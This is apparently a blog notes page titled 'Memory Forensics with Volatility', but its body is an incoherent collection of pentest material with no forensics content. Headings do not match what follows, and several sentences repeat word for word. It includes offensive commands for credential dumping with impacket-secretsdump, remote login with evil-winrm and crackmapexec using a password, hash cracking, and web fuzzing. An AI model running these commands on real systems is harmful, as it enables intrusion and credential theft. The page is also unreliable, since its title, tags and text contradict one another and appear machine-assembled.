---
TitleSEO: "Memory Forensics with Volatility | ZureFX"
TitlePost: "Memory Forensics with Volatility"
Author: "ZureFX"
Description: "Personal notes on Memory Forensics with Volatility. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, networking, persistence"
URL: "https://zurefx.github.io/notes/note-memory-forensics-with-volatility-443.html"
URL_IMAGES: ""
Date: "2025-05-20"
Tags: "Blue Team, Networking, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-memory-forensics-with-volatility-443"
Permalink: "/notes/note-memory-forensics-with-volatility-443.html"
BtnLabel: "Read Notes"
Pick: 0
---
## smbexec

### enum4linux

- `Local File Inclusion`
- `gobuster`
- `netcat`
- `Open Redirect`
- `Remote File Inclusion`
- `LXD Privilege Escalation`

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
feroxbuster -h
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.179.10/FUZZ
```

## sharphound

### SNMP

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

- `Pass the Hash`
- `Local File Inclusion`
- `SSTI`

## GetUserSPNs

### Java

```powershell
nmap -sCV -p389,3306,9200 10.85.134.247 -oN scan.txt
evil-winrm -i 10.79.2.11 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.111.118.97
```

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## ligolo-ng

### mimikatz

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.107.24.13
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
nmap -sCV -p27017,995,143 10.105.150.100 -oN scan.txt
crackmapexec smb 10.101.152.227 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.79.2/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.
